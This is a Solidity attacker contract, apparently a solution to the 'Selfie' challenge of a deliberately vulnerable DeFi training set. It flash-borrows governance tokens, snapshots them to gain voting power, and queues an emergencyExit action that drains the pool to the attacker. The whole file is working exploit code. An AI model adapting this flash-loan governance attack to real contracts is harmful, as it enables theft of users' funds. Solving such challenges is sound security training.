pragma solidity 0.8.16;

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";

contract SelfieAttacker {
    uint256 public id;

    SelfiePool private selfiePool;
    SimpleGovernance private simpleGovernance;

    constructor(address targetPool, address targetGovernance) {
        selfiePool = SelfiePool(targetPool);
        simpleGovernance = SimpleGovernance(targetGovernance);

        }

    function attack(address token) external {
        selfiePool.flashLoan(IERC3156FlashBorrower(address(this)), token, 1500000e18, "");
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        bytes memory emergencyExitData = abi.encodeWithSignature("emergencyExit(address)", tx.origin);
        DamnValuableTokenSnapshot(token).snapshot();
        id = simpleGovernance.queueAction(address(selfiePool), 0, emergencyExitData);
        IERC20(token).approve(msg.sender, 1500000e18);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}